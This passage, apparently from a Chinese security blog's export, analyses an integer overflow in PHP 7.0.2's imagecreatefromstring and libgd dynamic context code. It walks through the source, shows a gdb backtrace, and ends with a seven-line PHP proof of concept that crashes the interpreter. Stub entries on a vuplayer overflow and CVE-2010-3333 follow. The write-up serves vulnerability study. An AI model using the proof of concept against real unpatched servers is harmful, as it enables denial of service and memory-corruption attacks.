<p>定位到漏洞函数代码 /ext/gd/gd.c:2222<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">PHP_FUNCTION(imagecreatefromstring)</div><div class="line">&#123;</div><div class="line">         zval *data;</div><div class="line">         gdImagePtr im;</div><div class="line">         int imtype;</div><div class="line">         char sig[8];</div><div class="line"> </div><div class="line">         if (zend_parse_parameters(ZEND_NUM_ARGS(), &quot;z&quot;, &amp;data) == FAILURE) &#123;</div><div class="line">                   return;</div><div class="line">         &#125;</div><div class="line">         convert_to_string_ex(data);</div><div class="line">         if (Z_STRLEN_P(data) &lt; 8) &#123;</div><div class="line">                   php_error_docref(NULL, E_WARNING, &quot;Empty string or invalid image&quot;);</div><div class="line">                   RETURN_FALSE;</div><div class="line">         &#125;</div><div class="line">         memcpy(sig, Z_STRVAL_P(data), 8);</div><div class="line">         imtype = _php_image_type(sig);</div><div class="line">         switch (imtype) &#123;</div><div class="line">                   case PHP_GDIMG_TYPE_JPG:</div><div class="line">#ifdef HAVE_GD_JPG</div><div class="line">                            im = _php_image_create_from_string(data, &quot;JPEG&quot;, gdImageCreateFromJpegCtx);</div><div class="line">#else</div><div class="line">                            php_error_docref(NULL, E_WARNING, &quot;No JPEG support in this PHP build&quot;);</div><div class="line">                            RETURN_FALSE;</div><div class="line">#endif</div><div class="line">                            break;</div><div class="line">                   case PHP_GDIMG_TYPE_PNG:</div><div class="line">#ifdef HAVE_GD_PNG</div><div class="line">                            im = _php_image_create_from_string(data, &quot;PNG&quot;, gdImageCreateFromPngCtx);</div><div class="line">#else</div><div class="line">                            php_error_docref(NULL, E_WARNING, &quot;No PNG support in this PHP build&quot;);</div><div class="line">                            RETURN_FALSE;</div><div class="line">#endif</div><div class="line">                            break;</div><div class="line">                   case PHP_GDIMG_TYPE_GIF:</div><div class="line">                            im = _php_image_create_from_string(data, &quot;GIF&quot;, gdImageCreateFromGifCtx);</div><div class="line">                            break;</div><div class="line">                   case PHP_GDIMG_TYPE_WBM:</div><div class="line">                            im=_php_image_create_from_string(data,&quot;WBMP&quot;, gdImageCreateFromWBMPCtx);</div><div class="line">                            break；</div><div class="line">                   case PHP_GDIMG_TYPE_GD2:</div><div class="line">                            im = _php_image_create_from_string(data, &quot;GD2&quot;, gdImageCreateFromGd2Ctx);</div><div class="line">                            break;</div><div class="line">                   default:</div><div class="line">                            php_error_docref(NULL, E_WARNING, &quot;Data is not in a recognized format&quot;);</div><div class="line">                            RETURN_FALSE;</div><div class="line">         &#125;</div><div class="line">         if (!im) &#123;</div><div class="line">                   php_error_docref(NULL, E_WARNING, &quot;Couldn&apos;t create GD Image Stream out of Data&quot;);</div><div class="line">                   RETURN_FALSE;</div><div class="line">         &#125;</div><div class="line">         RETURN_RES(zend_register_resource(im, le_gd));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>有可能上面的代码长了点，但是只要找到关键函数就行了_php_image_create_from_string，在这个函数中的gdNewDynamicCtxEx这个函数才是关键点，跟踪进去就行了。在gd.c:2196行，假如你使用其他版本可能行号不一样，不过没事搜索函数就行了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">gdImagePtr _php_image_create_from_string(zval *data, char *tn, gdImagePtr (*ioctx_func_p)())</div><div class="line">&#123;</div><div class="line">         gdImagePtr im;</div><div class="line">         gdIOCtx *io_ctx;</div><div class="line">         io_ctx = gdNewDynamicCtxEx(Z_STRLEN_P(data),Z_STRVAL_P(data), 0);  //这边的传入参数的长度为0x80000000  由于是int，所以这边整数溢出。</div><div class="line">………………………………………………………………………………</div><div class="line">gdNewDynamicCtxEx函数代码，行号就不说了。</div><div class="line">gdIOCtx * gdNewDynamicCtxEx (int initialSize, void *data, int freeOKFlag)</div><div class="line">&#123;</div><div class="line">         dpIOCtx *ctx;</div><div class="line">         dynamicPtr *dp;</div><div class="line">         ctx = (dpIOCtx *) gdMalloc (sizeof (dpIOCtx));</div><div class="line">         dp = newDynamic(initialSize, data, freeOKFlag);</div><div class="line">         ctx-&gt;dp = dp; //这边将initialSize 赋值了</div><div class="line">         ctx-&gt;ctx.getC =dynamicGetchar; //这边造成栈溢出，跟踪进去进行了。</div><div class="line">………………………………………………………………………………</div><div class="line"></div><div class="line">newDynamic函数代码</div><div class="line">static dynamicPtr * newDynamic (int initialSize, void *data, int freeOKFlag)</div><div class="line">&#123;</div><div class="line">         dynamicPtr *dp;</div><div class="line">         dp = (dynamicPtr *) gdMalloc (sizeof (dynamicPtr)); // 这边申请了64个字节</div><div class="line">         allocDynamic (dp, initialSize, data);</div><div class="line">………………………………………………………..</div><div class="line">static int</div><div class="line">allocDynamic (dynamicPtr * dp, int initialSize, void *data)</div><div class="line">&#123;</div><div class="line">         if (data == NULL) &#123;</div><div class="line">                   dp-&gt;logicalSize = 0;</div><div class="line">                   dp-&gt;dataGood = FALSE;</div><div class="line">                   dp-&gt;data = gdMalloc(initialSize);  这里的initialSize的值为-2147483648</div><div class="line">         &#125; else &#123;</div><div class="line">                   dp-&gt;logicalSize = initialSize;</div><div class="line">                   dp-&gt;dataGood = TRUE;</div><div class="line">                   dp-&gt;data = data;</div><div class="line">         &#125;</div><div class="line">……………………………………………….</div><div class="line">static int dynamicGetchar (gdIOCtxPtr ctx)</div><div class="line">&#123;</div><div class="line">         unsigned char b;</div><div class="line">         int rv;</div><div class="line">         rv = dynamicGetbuf (ctx, &amp;b, 1);</div><div class="line"> </div><div class="line">………………………………………………………………………………</div><div class="line">static int dynamicGetbuf (gdIOCtxPtr ctx, void *buf, int len)</div><div class="line">&#123;</div><div class="line">         int rlen, remain;</div><div class="line">         dpIOCtxPtr dctx;</div><div class="line">         dynamicPtr *dp;</div><div class="line">         dctx = (dpIOCtxPtr) ctx;</div><div class="line">         dp = dctx-&gt;dp;</div><div class="line">         remain = dp-&gt;logicalSize - dp-&gt;pos;</div><div class="line">         if (remain &gt;= len) &#123;</div><div class="line">                   rlen = len;</div><div class="line">         &#125; else &#123;</div><div class="line">                   if (remain == 0) &#123;</div><div class="line">                            return EOF;</div><div class="line">                   &#125;</div><div class="line">                   rlen = remain;//上面的remain 的值为负数，没有检查，直接比较后赋值，所以导致下面的rlen的值过大造成栈溢出。</div><div class="line">         &#125;</div><div class="line">         memcpy(buf, (void *) ((char *) dp-&gt;data + dp-&gt;pos), rlen); //这边造成了栈溢出</div></pre></td></tr></table></figure></p>
<p>下面是几个结构体，可以对照着去理解代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">typedef struct gdIOCtx &#123;</div><div class="line">         int    (*getC)(struct gdIOCtx*);</div><div class="line">         int    (*getBuf)(struct gdIOCtx*, void*, int);</div><div class="line">         void  (*putC)(struct gdIOCtx*, int);</div><div class="line">         int    (*putBuf)(struct gdIOCtx*, const void*, int);</div><div class="line">         int    (*seek)(struct gdIOCtx*, const int);</div><div class="line">         long (*tell)(struct gdIOCtx*);</div><div class="line">         void  (*gd_free)(struct gdIOCtx*);</div><div class="line">         void  *data;</div><div class="line">&#125; gdIOCtx;</div><div class="line">………………………………………………………………………………</div><div class="line">typedef struct dpStruct</div><div class="line">&#123;</div><div class="line">         void *data;</div><div class="line">         int logicalSize;</div><div class="line">         int realSize;</div><div class="line">         int dataGood;</div><div class="line">         int pos;</div><div class="line">         int freeOK;</div><div class="line">&#125; dynamicPtr;</div><div class="line">………………………………………………………………………………</div><div class="line">typedef struct dpIOCtx</div><div class="line">&#123;</div><div class="line">         gdIOCtx ctx;</div><div class="line">         dynamicPtr *dp;</div><div class="line">&#125; dpIOCtx;</div><div class="line">………………………………………………………………………………</div></pre></td></tr></table></figure></p>
<p>下面是gdb的调试信息,不知道为什么参数的值没有显示出来。有些代码直接阅读比较麻烦，可以gdb调试代码，再调试的同时，打印出它的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">root@mhn:~# gdb -q --args php-7.0.2/sapi/cli/php -n test.php</div><div class="line">Reading symbols from php-7.0.2/sapi/cli/php...done.</div><div class="line">(gdb) r</div><div class="line">Starting program: /root/php-7.0.2/sapi/cli/php -n test.php</div><div class="line">[Thread debugging using libthread_db enabled]</div><div class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</div><div class="line"> </div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">__memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:118</div><div class="line">118  ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.</div><div class="line">(gdb) bt</div><div class="line">#0  __memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:118</div><div class="line">#1  0x000000000059c1cf in memcpy (__len=18446744071562067968, __src=&lt;optimized out&gt;, __dest=&lt;optimized out&gt;) at /usr/include/x86_64-linux-gnu/bits/string3.h:51</div><div class="line">#2  dynamicGetbuf (ctx=&lt;optimized out&gt;, buf=&lt;optimized out&gt;, len=&lt;optimized out&gt;) at /root/php-7.0.2/ext/gd/libgd/gd_io_dp.c:246</div><div class="line">#3  0x000000000059dd05 in php_gd_fill_input_buffer (cinfo=0x7fffffffaa70) at /root/php-7.0.2/ext/gd/libgd/gd_jpeg.c:607</div><div class="line">#4  0x00007ffff73144e6 in ?? () from /usr/lib/x86_64-linux-gnu/libjpeg.so.8</div><div class="line">#5  0x00007ffff73129ca in ?? () from /usr/lib/x86_64-linux-gnu/libjpeg.so.8</div></pre></td></tr></table></figure></p>
<p>poc就放下面了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">ini_set(&apos;memory_limit&apos;,-1);</div><div class="line">$var_3  =  str_repeat(&quot;A&quot;,0x80000000);</div><div class="line">$var_3[0]=&quot;\xff&quot;;</div><div class="line">$var_3[1]=&quot;\xd8&quot;;</div><div class="line">$var_3[2]=&quot;\xff&quot;;</div><div class="line">imagecreatefromstring($var_3);</div></pre></td></tr></table></figure></p>
<p>这边为什么要替换变量的值呢，由于它上面会检查文件头是否为真实的图片。所以我这边用了jpg的文件头，应该是吧，我也忘了啥文件头，反正只要网上搜索一下图片的文件头就行了。</p>
<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>说实话我也是初学者，只能这样写一篇文章了，网上的php底层的漏洞挖掘太少了，就只有应用层的代码审计，希望能够给初学者们帮助吧。如果写的有啥不对的地方欢迎指出。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://bugs.php.net/bug.php?id=73280" target="_blank" rel="external">https://bugs.php.net/bug.php?id=73280</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[vuplayer stack overflow]]></title>
      <url>http://yoursite.com/2016/10/11/vuplayer-stack-overflow/</url>
      <content type="html"><![CDATA[<p>一、漏洞环境<br>vuplayer2.49   win7 32</p>
<p>由于win7 没有找到绕过aslr的方法，但是dep绕过了。</p>
<p><a href="https://github.com/whiteHat001/vuplayer/" target="_blank" rel="external">下载地址</a><br>参考资料:<a href="https://www.exploit-db.com/exploits/40172/" target="_blank" rel="external">https://www.exploit-db.com/exploits/40172/</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[cve-2010-3333调试学习笔记]]></title>
      <url>http://yoursite.com/2016/09/23/cve-2010-3333%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>由于第一次分析，难免会有错误，希望能够指出。<br><a href="https://github.com/whiteHat001/cve-2010-3333" target="_blank" rel="external">下载地址</a><br>参考文档:《漏洞战争》</p>
]]></content>
    </entry>
    
  
  
</search>
